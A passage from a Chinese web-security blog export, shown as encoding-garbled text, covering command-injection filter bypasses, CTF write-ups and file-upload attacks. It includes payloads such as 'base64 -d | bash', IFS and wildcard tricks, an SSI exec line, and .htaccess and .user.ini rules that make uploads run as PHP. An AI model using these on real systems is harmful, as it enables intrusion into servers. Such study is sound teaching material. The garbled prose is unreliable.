è¾“æŠ€å·§</a></p></li><li><p>é‡å®šå‘å†™å…¥</p><blockquote><p><strong>webshellç‰¹æ®Šç¬¦å·é—®é¢˜ï¼Œå¯ä»¥å…ˆåšbase64ç¼–ç å†™å…¥ï¼Œç„¶åå†è§£ç </strong></p></blockquote></li></ul><h4 id="ä¸å‡ºç½‘"><a href="#ä¸å‡ºç½‘" class="headerlink" title="ä¸å‡ºç½‘"></a>ä¸å‡ºç½‘</h4><p>é‡å®šå‘å†™å…¥</p><h2 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"><a href="#å¤šæ¡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å¤šæ¡å‘½ä»¤æ‰§è¡Œ"></a>å¤šæ¡å‘½ä»¤æ‰§è¡Œ</h4><table><thead><tr><th align="center"></th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</td></tr><tr><td align="center">ï¼›</td><td align="center">ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">||</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">æ¢è¡Œæ‰§è¡Œå‘½ä»¤</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr><tr><td align="center">$()</td><td align="center">å†…æ•›æ‰§è¡Œ</td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title="."></a>.</h4><p>Linux ä¸­ï¼Œ<code>.</code>ä¹Ÿå«<code>period</code>ï¼Œå®ƒçš„ä½œç”¨å’Œ<code>source</code>ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„ shell æ˜¯ bashï¼Œåˆ™ <code>. filename</code>çš„æ„æ€å°±æ˜¯ç”¨ bash æ‰§è¡Œ filename æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><ul><li>base64</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure><ul><li><p>è¿›åˆ¶ç»•è¿‡</p><p>shellè§£æå…«è¿›åˆ¶ï¼Œ<code>ls</code> â†’ <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpä¼ å‚æ—¶çš„æ ¼å¼</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>è¿›åˆ¶è½¬æ¢</li></ul> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul><h4 id="phpç»•è¿‡"><a href="#phpç»•è¿‡" class="headerlink" title="phpç»•è¿‡"></a>phpç»•è¿‡</h4><p>phpèŠ±æ ·å°±å¤šäº†ğŸ˜‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h4><ol><li><p>æ’å…¥\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>æ’å…¥ç©ºå­—ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; ï¼ˆåªè¦æ’å…¥æˆå¯¹çš„å•åŒå¼•å·å°±å¯ä»¥ï¼‰</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9ä¸ºè„šæœ¬å‚æ•°</p><p>${xx}ä»£è¡¨å˜é‡å€¼,åªè¦xxæ²¡æœ‰å®šä¹‰å³å¯</p><p>å†…æ•›æ‰§è¡Œç©ºå‘½ä»¤</p></blockquote></li><li><p>å˜é‡æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>å…¶ä»–å‘½ä»¤ä»£æ›¿</p></li><li><p>æ–‡ä»¶åç”¨é€šé…ç¬¦</p></li></ol><h4 id="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"><a href="#è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡" class="headerlink" title="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"></a>è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-4-8-ubuntu:~$ echo  $PS2</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h4><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+ç©ºå­—ç¬¦</li><li>é‡å®šå‘ç¬¦</li><li><code>&#123;cat,flag.php&#125;</code></li><li>urlå‚æ•°ç¼–ç ï¼Œç©ºæ ¼%20ï¼Œåˆ¶è¡¨ç¬¦%09</li></ol><h4 id="ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡"><a href="#ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡" class="headerlink" title="ç›®å½•åˆ†éš”ç¬¦/ç»•è¿‡"></a>ç›®å½•åˆ†éš”ç¬¦<code>/</code>ç»•è¿‡</h4><ol><li><p>å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œå…ˆcdåˆ°ç›®çš„ç›®å½•ï¼Œå†æ‰§è¡Œcatç­‰å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>æˆªå–ç¯å¢ƒå˜é‡</p><p><code>env</code>æˆ–è€…<code>printenv</code>ï¼šæ‰“å°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h4 id="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"><a href="#é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡"></a>é‡å®šå‘å†™æ–‡ä»¶ç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;shell&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h4 id="å†…æ•›æ‰§è¡Œç»•è¿‡"><a href="#å†…æ•›æ‰§è¡Œç»•è¿‡" class="headerlink" title="å†…æ•›æ‰§è¡Œç»•è¿‡"></a>å†…æ•›æ‰§è¡Œç»•è¿‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h4><h5 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h5><ol><li><p>lsè¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å­—å…¸æ’åºçš„</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\æ”¾åœ¨æŒ‡ä»¤çš„æœ€æœ«ç«¯ï¼Œè¡¨ç¤ºæŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>å°†æ–‡ä»¶åï¼ˆå‘½ä»¤ï¼‰æŒ‰æ—¶é—´é‡å®šå‘åˆ°è„šæœ¬æ–‡ä»¶aä¸­ï¼Œ<code>sh a</code>æ‰§è¡Œè„šæœ¬aã€‚</p><p>æ³¨ï¼šå°†æ‰§è¡Œçš„å‘½ä»¤ååºç”Ÿæˆã€‚<code>\\</code>æ˜¯ä¸ºäº†è½¬ä¹‰ï¼Œè®©æ–‡ä»¶åå¸¦ä¸Š\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºå‘½ä»¤ï¼Œå…¶ä»–ä¸ºè¯¥å‘½ä»¤çš„å‚æ•°</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>åœ¨è¿™ä¸ªåŸºç¡€ä¸Š<code>*o</code>ä¹Ÿå¯ä»¥ï¼Œå°±æ˜¯å–å‡ºæ»¡è¶³æ­£åˆ™*oçš„æ–‡ä»¶åæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h5><p>ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>ç„¶åå°è¯•è®¿é—®&#x2F;tmp&#x2F;aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜<code>&gt;a</code>å…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚</p><ul><li><p>è§£æ³•1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>cp /* .</code>ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;flagå³å¯</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>è§£æ³•2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>nl /*&gt;a</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;aå³å¯</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>è§£æ³•3</p><p>è„šæœ¬ç›´æ¥å†™ğŸ</p></li></ul><h4 id="æ— æ•°å­—ç»•è¿‡"><a href="#æ— æ•°å­—ç»•è¿‡" class="headerlink" title="æ— æ•°å­—ç»•è¿‡"></a>æ— æ•°å­—ç»•è¿‡</h4><p>å®‰æ´µæ¯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨$</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshellç±»ï¼šè„šæœ¬æ–‡ä»¶</span><br><span class="line">XSSç±»ï¼šsvgï¼Œhtmlï¼Œpdfæ–‡ä»¶,å¦‚æœåç«¯ä¸ºnodejsï¼Œå¯ä»¥xss to rce</span><br><span class="line">SSRFç±»ï¼šPDF</span><br><span class="line">XXEç±»ï¼šdocxã€xlsxï¼Œsvg</span><br><span class="line">RCEç±»ï¼špharæ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–æ”»å‡» # é¸¡è‚‹ï¼Œè¦æœ‰æºç ï¼Œè¿˜è¦æœ‰å±é™©æ–¹æ³•</span><br><span class="line">ç›®å½•ç©¿è¶Šï¼šæ–‡ä»¶è¦†ç›–ï¼Œsshå…¬é’¥</span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDFè§£æå™¨html&#x2F;XSS å®ç°SSRF - ç«çº¿ Zone-å®‰å…¨æ”»é˜²ç¤¾åŒº</a></p><h1 id="PHPç›¸å…³ä»£ç "><a href="#PHPç›¸å…³ä»£ç " class="headerlink" title="PHPç›¸å…³ä»£ç "></a>PHPç›¸å…³ä»£ç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]æ˜¯Content-Dispositionä¸­nameçš„å€¼</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] å®¢æˆ·ç«¯æ–‡ä»¶åç§°</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] æ–‡ä»¶çš„MIMEç±»å‹       image/jpeg,image/png</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] æ–‡ä»¶å¤§å° å•ä½å­—èŠ‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] æ–‡ä»¶è¢«ä¸Šä¼ åå†æœåŠ¡å™¨ç«¯ä¸´æ—¶æ–‡ä»¶åï¼Œå¯ä»¥åœ¨php.iniä¸­æŒ‡å®š</span><br><span class="line">    </span><br><span class="line"><span class="comment"># åŠ å…¥æ–‡ä»¶å¤´ç»•è¿‡ï¼šGIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  å›¾ç‰‡å¤§å°</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  å›¾ç‰‡ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¿‡ç¨‹</p><blockquote><p>åœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œæ–‡ä»¶é»˜è®¤è¢«å‚¨å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶å¿…é¡»æŠŠä»–ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œå¦åˆ™ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>copyæˆ–</code>è€…<code>move_uploaded_file</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><ul><li><p>ä¸­é—´ä»¶é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è§£æå…¶ä»–è„šæœ¬åç¼€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.php3 .php4 .php5  .pht  .phtml  .phar  .shtml </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .shtml    </span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥ä¸Šä¼ ç›¸å…³é…ç½®æ–‡ä»¶</p><ul><li><p>.htaccess</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_.htaccess ctf_Y4tackerçš„åšå®¢-CSDNåšå®¢</a></p><p>åªèƒ½ç”¨äºApache</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å½“æ–‡ä»¶åä¸­åŒ…å«shellæ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šè¢«Apacheå½“ä½œphpè§£æ</span></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.pngæ–‡ä»¶ä¹Ÿå¯ä»¥æ‰§è¡Œphpç¨‹åº</span></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯äº†cgiæ‰©å±•ï¼šæ‰©å±•åä¸º.yyyçš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†</span></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .yyy</span><br></pre></td></tr></table></figure><p>ä¿®å¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨é…ç½®æ–‡ä»¶ä¸­å°†AllowOverride ALLæ”¹ä¸ºAllowOverride None</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><p>ä½¿ç”¨æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apacheå’ŒNginxéƒ½å¯ä»¥ï¼Œåªéœ€æ»¡è¶³ï¼š</span><br><span class="line">æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGI</span><br><span class="line">FastCGIæ¨¡å¼</span><br><span class="line">ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=file_name  <span class="comment">#è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹å‰å…ˆè¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_append_file</span>=file_name  <span class="comment">#è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹åæ‰§è¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>è¿‡æ»¤ä¸å½“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€åç¼€åŒå†™ç»•è¿‡ã€åç¼€å¤§å°å†™ç»•è¿‡</span><br></pre></td></tr></table></figure></li><li><p>Apacheè§£ææ¼æ´</p><ul><li><p>ä»å³å¾€å·¦è§£ææ¼æ´</p><p>äº§ç”ŸåŸå› ï¼š</p><p>å‰æï¼š<strong>phpä½œä¸ºapacheçš„ä¸€ä¸ªå­æ¨¡å—æ¥è¿è¡Œ</strong></p><p><img src="/../images/image-20230617172156170.png" alt="image-20230617172156170"></p><p>apacheæ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ï¼Œå¦‚æœè¿ç»´äººå‘˜ç»™<code>.php</code> åç¼€å¢åŠ äº†å¤„ç†å™¨</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apacheä¼šä»å³å‘å·¦ï¼Œä¾æ¬¡è¯†åˆ«åç¼€ï¼Œç›´åˆ°é‡åˆ°è‡ªå·±èƒ½è§£æçš„æ–‡ä»¶åä¸ºæ­¢ã€‚é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰<code>.php</code> åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆ PHP æ–‡ä»¶ã€‚</p><p>å‡è®¾ä¸Šä¼ çš„æ–‡ä»¶åä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•ä¸º.phpï¼Œä¼šå°†å…¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè½»æ¾ç»•è¿‡<strong>é»‘ç™½åå•</strong>ã€‚</p><p>vulhubå¤ç°</p><p><img src="/../images/image-20230617172318530.png" alt="image-20230617172318530"></p><p>æœ¬åœ°cgiæ¨¡å¼å¤ç°</p></li></ul><p><img src="/../images/image-20230617172525788.png" alt="image-20230617172525788"></p><p><img src="/../images/image-20230617172355992.png" alt="image-20230617172355992"></p><ul><li><p>HTTPDæ¢è¡Œè§£ææ¼æ´â€“CVE-2017-15715</p><p>äº§ç”ŸåŸå› ï¼š</p><p>é…ç½®ä¸­çš„æ­£åˆ™ç¼ºé™·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span 